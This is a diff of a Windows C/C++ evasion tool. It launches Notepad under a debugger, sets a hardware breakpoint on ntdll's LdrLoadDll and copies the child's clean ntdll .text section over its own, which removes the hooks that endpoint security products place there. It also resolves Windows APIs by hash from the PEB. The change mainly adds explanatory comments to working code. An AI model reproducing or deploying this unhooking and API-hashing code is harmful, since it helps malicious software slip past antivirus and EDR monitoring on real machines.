@@ -128,19 +128,9 @@ VOID SetHWBP(DWORD_PTR address, HANDLE hThread)
 			if (dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress == (LPVOID)address)
 			{
 				printf("[+] Breakpoint Hit!\n");
-				/*printf("[-] Exception (%#llx) ! Params:\n", dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress);
-				printf("(1) Rcx: %#d | ", newCtx.Rcx);
-				printf("(2) Rdx: %#llx | ", newCtx.Rdx);
-				printf("(3) R8: %#llx | ", newCtx.R8);
-				printf("(4) R9: %#llx\n", newCtx.R9);
-				printf("RSP = %#llx\n", newCtx.Rsp);
-				printf("RAX = %#llx\n", newCtx.Rax);
-				printf("DR0 = %#llx\n", newCtx.Dr0);
-				printf("RIP = %#llx\n----------------------------------------\n", newCtx.Rip);*/
-
 				newCtx.Dr0 = newCtx.Dr6 = newCtx.Dr7 = 0;
 				newCtx.EFlags |= (1 << 8);
-				return;
+				return; // <-- DROP without ContinueDebugEvent
 			}
 			else {
 				newCtx.Dr0 = address;
@@ -156,7 +146,7 @@ VOID SetHWBP(DWORD_PTR address, HANDLE hThread)
 int CopyDLLFromDebugProcess(HANDLE hProc, size_t bAddress, BOOL stealth)
 {
 
-	HMODULE hKernel_32 = GetModuleFromPEB(109513359);
+	HMODULE hKernel_32 = GetModuleFromPEB(109513359); // <-- API Hashing
 	HMODULE hNtdll = GetModuleFromPEB(4097367);
 
 	_NtReadVirtualMemory NtReadVirtualMemoryCustom = (_NtReadVirtualMemory)GetAPIFromPEBModule(hNtdll, 228701921503);
@@ -183,6 +173,9 @@ int CopyDLLFromDebugProcess(HANDLE hProc, size_t bAddress, BOOL stealth)
 			return 1;
 		}
 	}
+	/**
+	 * Read ntdll.dll Image from [debugee process]
+	 */
 	NTSTATUS status = (*NtReadVirtualMemoryCustom)(hProc, (PVOID)bAddress, freshDll, DllSize, 0);
 	if (status != 0)
 	{
@@ -193,29 +186,27 @@ int CopyDLLFromDebugProcess(HANDLE hProc, size_t bAddress, BOOL stealth)
 	
 	for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
 	{
-
-
 		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
-
 		if (strcmp((char*)hookedSectionHeader->Name, (char*)".text") != 0)
 			continue;
 
 		DWORD oldProtection = 0;
 		bool isProtected = VirtualProtectCustom((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
-		
-		
-		
 		DWORD textSectionSize = hookedSectionHeader->Misc.VirtualSize;
 
-		// Get the source and destination addresses for the .text section
+		/*
+		 * (byte*)srcAddr : pure .text section of ntdll.dll raw image binary
+		 */
 		LPVOID srcAddr = (LPVOID)((DWORD_PTR)freshDll + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
+
+		/**
+		 * (void*)destsAddr : .text section of ntdll.dll image of [debugger process]
+		 */
 		LPVOID destAddr = (LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
 
-		// Calculate the number of chunks needed to copy the entire .text section
+		// copy raw ntdll.dll image destAddr to srcAddr
 		size_t chunkSize = 1024;
 		size_t numChunks = (textSectionSize + chunkSize - 1) / chunkSize;
-
-		// Iterate over each chunk and copy it to the destination
 		for (size_t i = 0; i < numChunks; i++)
 		{
 			size_t chunkStart = i * chunkSize;
@@ -223,8 +214,8 @@ int CopyDLLFromDebugProcess(HANDLE hProc, size_t bAddress, BOOL stealth)
 			size_t chunkSize = chunkEnd - chunkStart;
 			memcpy((char*)destAddr + chunkStart, (char*)srcAddr + chunkStart, chunkSize);
 		}
-
-		//memcpy((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)freshDll + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+		
+		// revert mem priv
 		isProtected = VirtualProtectCustom((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
 		if (isProtected == FALSE)
 		{
@@ -253,18 +244,26 @@ int main(int argc, char* argv[])
 	}
 	
 	printf("[+] Creating new process in debug mode\n");
+	/**
+	 * Create child process with DEBUG flag
+	 */
 	PROCESS_INFORMATION process = createProcessInDebug((wchar_t*)LR"(C:\Windows\Notepad.exe)");
 	HANDLE hThread = process.hThread;
 
 	HMODULE hNtdll = GetModuleFromPEB(4097367);
 	HMODULE hKernel_32 = GetModuleFromPEB(109513359);
+	/**
+	 * Get !ntdll.LdrLoadDll Address
+	 */
 	_LdrLoadDll LdrLoadDllCustom = (_LdrLoadDll)GetAPIFromPEBModule(hNtdll, 11529801);
 	
 	size_t LdrLoadDllAddress = reinterpret_cast<size_t>(LdrLoadDllCustom);
 	printf("[+] Found LdrLoadDllAddress address: 0x%p\n", LdrLoadDllAddress);
-
 	printf("[+] Setting HWBP on remote process\n");
 
+	/**
+	 * Set Hardware BP at !ntdll.LdrLoadDll
+	 */
 	SetHWBP((DWORD_PTR)LdrLoadDllAddress, hThread);
 	printf("[+] Copying clean ntdll from remote process\n");
 
